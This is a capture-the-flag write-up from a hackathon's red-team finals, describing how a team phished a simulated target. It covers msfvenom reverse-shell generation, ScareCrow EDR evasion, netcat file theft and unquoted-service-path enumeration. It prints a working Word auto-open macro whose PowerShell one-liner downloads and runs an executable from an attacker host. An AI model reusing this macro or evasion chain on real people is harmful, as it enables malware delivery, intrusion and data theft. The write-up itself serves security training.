---
layout: post
title: ABC RedTeam CTF
categories: ctf
---

## **ABC CyberHackathon RedTeam CTF**

#### [CY3ER-R4T](https://cyberrat.medium.com/)
## INTRODUCTION

My team RedTeamNG recently came first in the The American Business Council Cybersecurity Hackathon 2021 organized by NaijaSecForce in patnership with major sponsors bothering from American Business Council,Microsoft,AWS, Cisco, Comercio, HP, IBM and others

This write up would be focused only on the finals and specifically the RedTeam challenges running through the methodology used to tackling it,  
other post by my team mate [Muzec](https://muzec0318.github.io/posts/abcctf.html) would be covering the Web Challenges.

### SCENARIO

The scenario we are presented with by the organizers is that of an Fat Fingered individual that unconsciously opens every email and attachment he gets in he’s corporate email : [obiora\_nurudeen@ctf.ng](http://mailto:obiora_nurudeen@ctf.ng)

<img src="/assets/images/abcctf/scenario.png" height="100%" width="100%">

Armed with just he’s name Nurudeen Obiora, the email above and the knowledge of the targets low awareness in basic email security,  
we thought of emulating a strategy we recently used at the DEFCON 29 RedTeam CTF by sending the target an email with the reverse shell payload attached.

Now here is where the problem begins, as with almost every field: There is a race, race between Good and Bad, Positive and Negative  
our intentions are of no good so every mechanism of security is against us which is a “replica” of a real life situation

**1st attempt:** _Sending an msfvenom payload + gmail_  
Using msfvenom we created a windows reverse shell payload


<img src="/assets/images/abcctf/msfvenom.gif" height="100%" width="100%">

Attempting to send it to the target using swaks  
swaks : SWiss Army Knife Smtp

we are immediately flagged as malicious by Gmails Egress Malware Scanner

<img src="/assets/images/abcctf/egress-gmail.gif" height="100%" width="100%">

**2nd attempts:** We resulted into trying several empire powershell payload and bypasses, Persian Hydra Xor encryption with Custom keys, EgeBalci/sgn Shikata\_ga\_nai encoder, All to no avail

<img src="/assets/images/abcctf/head-boom.gif" height="100%" width="100%">

**Final attempt:** After numerous swift and failed attempt, we remembered Matthew Eidelberg talk at SourceZero Con : Remaining Invisible in the Age of EDR, a talk which showcase the ability to bypass defenses with a term called DLL unhooking using the ScareCrow Binary

In short, we can generate some raw shellcode from the software of our choice (Cobalt Strike, Metasploit, PoshC2, etc) and pass it to the Scarecrow to get a loader back that will implement some common EDR evasion techniques.

we decide to create a create a `windows/x64/meterpreter\reverse\tcp` shellcode using msfvenom \[msfvenom shellcode is a pain, its crappy and might be unstable at times\]
<img src="/assets/images/abcctf/msfvenom.gif" height="100%" width="100%">

then pass the raw shellcode to the scarecrow binary along with a random domain name for a cloned signed certificate

<img src="/assets/images/abcctf/scarecrow.png" height="100%" width="100%">

we then created a meterpreter listener using the connection variable of the shellcode as options: “would have preferred Cobalt-strike but its for the BigBoys like InfosecShinobi 🙂”

### DELIVERY

The output of ScareCrow is an obfuscated .exe payload, being at the third stage of the “cyber attack cycle” which is delivery  
we somehow need to get the payload the victim machine and “run” it

We decided to use the old aged Microsoft Word Document with macro in the .docm extension,  
the function of the macro was to run a powershell one-liner that downloads the payload \[Powerpnt.exe\] binary hosted on our machine, store it in C:\\windows\\temp\\ and then run it

> Sub Document\_Open()  
> MyMacro  
> End Sub
> 
> Sub AutoOpen()  
> MyMacro  
> End Sub
> 
> Sub MyMacro()  
> Dim str As String  
> str = “powershell iwr -uri [http://x.x.x.x/](http://20.87.43.15/OutLook.exe)Powerpnt.exe -o c:\\windows\\temp\\Powerpnt.exe; c:\\windows\\temp\\Powerpnt.exe”  
> GetObject**(**“winmgmts:”**)**.Get**(**“Win32\_Process”**)**.Create str, Null, Null, pid  
> Shell str, vbHide  
> End Sub


<img src="/assets/images/abcctf/macro.png" height="100%" width="100%">

it isnt advised to host any binary payload with the python http.server as there can be issues with the way it handles powershell Invoke Web Request or HTTPrequest  at times, starting a proper apache server is a better option 
Also know what port your binary is hosted on is important as there could be egress firewalls on the victim PC to non HTTP, HTTPS port  

<img src="/assets/images/abcctf/apache_host.gif" height="100%" width="100%"> 


### WEAPONIZATION

Weaponized the final email and sent the .docm to the target by gmail

<img src="/assets/images/abcctf/weapon-email.png" height="100%" width="100%"> 

Tick! tock! Tick! tock!  
Itchy finger Nurudeen opens the malicious document with the payload sending us a meterpreter session on our VPS \[wish it was cobalt strike, somebody buy us cobalt strike already!!\]

<img src="/assets/images/abcctf/meterpreter.png" height="100%" width="100%"> 

Now the hunt for flags begin, which literally means _ENUMERATION_  
checking to see what the internal IP looks like, we find the user IP address we we already solved the unintended way by checking the header of the response email`\[FLAG8\]`

<img src="/assets/images/abcctf/header.png" height="100%" width="100%">

checking the current user directory and finding `unattend.xml` that contains `\[FLAG4\]`

<img src="/assets/images/abcctf/ctf_xml.jpeg" height="100%" width="100%">

curious about what local users are on the machine just to get an idea of what movement of privilege escalation was necessary, lateral or horizontal  
we find two more flags `\[FLAG3\]` `\[FLAG5\]`


<img src="/assets/images/abcctf/net_user.jpeg" height="100%" width="100%">

One of the challenges goes by the name “Registry Never Lies” which immediately prompted us to query the registry table to find \[FLAG2\]

<img src="/assets/images/abcctf/regq.jpeg" height="100%" width="100%">


The what seems to be easy challenge turned to a battle “Outlook Storage 150points”, as most application data are stored in %APPDATA% we dived into it to get our hands on the loot after a quick research we figure the ost file is the microsoft outlook data bucket trying to transfer the file using the netcat binary, it failed cause the file was currently locked with the outlook process.

We proceeded to killing the process and sending the OST to our local machine with netcat

<img src="/assets/images/abcctf/task_kill.jpeg" height="100%" width="100%">

Converting the ost with the steller converter we find `\[FLAG1\]`

<img src="/assets/images/abcctf/steller.png" height="100%" width="100%">

After running out of flags to find, it was time for horizontal privilege escalation

### LATERAL PRIVILEGE ESCALATION  
**Machine Misconfigured with an Unquoted Service Path**

Sometimes it is possible to escalate privileges by abusing mis-configured services. Specifically, this is possible if path to the service binary is not wrapped in quotes and there are spaces in the path..  
If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin; otherwise, the file name is ambiguous.

For example, consider the string “c:\\program files\\safe software\\enjoy.exe”. This string can be interpreted in a number of ways.  
The system tries to interpret the possibilities in the following order:

**c:\\program.exe**  
**c:\\program files\\safe.exe**  
**c:\\program files\\safe software\\enjoy.exe**

if any of the directory along the path is writable and said service is running with system privileges then this misconfiguration is easily exploitable

we can enumerate and find Unquoted Service Path by using the wmic command `wmic service get name,pathname`

we can aswell check to see if the service is running with system privileges still by using wmic `wmic service get pathname,startname`


<img src="/assets/images/abcctf/servicepath.png" height="100%" width="100%">

> **END OF PART ONE**
>#### The difference between a noob and a hacker is that a hacker has failed more than a noob has ever tried



